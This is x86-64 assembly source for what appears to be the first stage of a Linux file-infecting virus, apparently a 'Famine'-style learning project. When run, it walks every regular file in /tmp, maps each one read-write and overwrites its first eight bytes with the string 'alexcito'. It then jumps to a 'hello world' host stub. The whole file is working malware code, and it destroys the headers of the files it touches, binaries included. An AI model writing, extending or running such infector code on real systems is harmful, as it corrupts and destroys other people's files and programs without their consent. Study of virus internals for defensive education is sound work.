%include "famine.inc"

BUF_SIZE    equ 1024
LOCAL_VARS  equ 1024

bits 64
default rel
global _start
section .text

strlen:         xor         rax, rax
.loop:          cmp         byte [rax + rdi], 0
                jz          .done
                inc         rax
                jmp         .loop
.done:          ret


puts:           call        strlen
                mov         rdx, rax
                mov         rsi, rdi
                mov         rdi, 1
                mov         rax, __NR_write
                syscall
                ret

patsy_host:     lea         rdi, [rel hello]
                call        puts

                xor         rdi, rdi
                mov         rax, __NR_exit
                syscall
hello           db          "hello world",33,10,0


_start:
                lea         rdi, [rel slash_tmp]
                mov         rsi, O_RDONLY | O_DIRECTORY
                mov         rax, __NR_open
                syscall
                test        rax, rax
                jl          return

                mov         [rel directory_fd], rax

                mov         rdi, rax
                mov         rax, __NR_fchdir
                syscall
                test        rax, rax
                jl          return

                lea         rax, [rsp - (BUF_SIZE + LOCAL_VARS)]
                mov         [rel getdents_buf], rax

scandir:        mov         rdx, BUF_SIZE
                mov         rsi, [rel getdents_buf]
                mov         rdi, [rel directory_fd]
                mov         rax, __NR_getdents64
                syscall
                test        rax, rax
                jle         scandir_done

                mov         [rel getdents_size], rax            ; nread from getdents64
                xor         rdx, rdx
                mov         [rel getdents_idx], rdx

scandir_file:   mov         rdi, [rel getdents_buf]
                add         rdi, [rel getdents_idx]

                cmp         byte [rdi + 18], DT_REG
                jne         scandir_next

                add         rdi, 19                             ; d_name[]
                call        infect

scandir_next:   mov         rdi, [rel getdents_buf]
                add         rdi, [rel getdents_idx]
                movzx       rax, word [rdi + 16]                ; d_reclen
                add         rax, [rel getdents_idx]
                mov         [rel getdents_idx], rax
                mov         rdx, [rel getdents_size]
                cmp         rax, rdx
                jl          scandir_file
                jmp         scandir

scandir_done:   mov         rdi, [rel directory_fd]
                mov         rax, __NR_close
                syscall
return:
                jmp         [rel entry]


infect:                                                         ; expecting filename in rdi
                mov         rsi, O_RDWR
                mov         rax, __NR_open
                syscall
                test        rax, rax
                jl          infect_return

                mov         [rel infect_fd], rax

                lea         rsi, [rsp - 256]                    ; buf
                mov         rdi, [rel infect_fd]
                mov         rax, __NR_fstat
                syscall
                cmp         rax, 0
                jnz         infect_close

                mov         rax, qword [rsp - (256-48)]         ; st_size
                mov         [rel infect_fsize], rax


                xor         r9, r9
                mov         r8, [rel infect_fd]
                mov         r10, MAP_SHARED
                mov         rdx, PROT_READ | PROT_WRITE
                mov         rsi, rax
                xor         rdi, rdi
                mov         rax, __NR_mmap
                syscall
                cmp         rax, -4095
                jae         infect_close

                mov         rdx, 'alexcito'
                mov         qword [rax], rdx

                mov         rdi, rax
                mov         rsi, [rel infect_fsize]
                mov         rax, __NR_munmap
                syscall

infect_close:   mov         rdi, [rel infect_fd]
                mov         rax, __NR_close
                syscall
infect_return:  ret

directory_fd    dq          -1
getdents_buf    dq          -1
getdents_size   dq          -1
getdents_idx    dq          -1
infect_fd       dq          -1
infect_fsize    dq          -1



slash_tmp   db "/tmp",0
entry       dq patsy_host
_finish     equ $
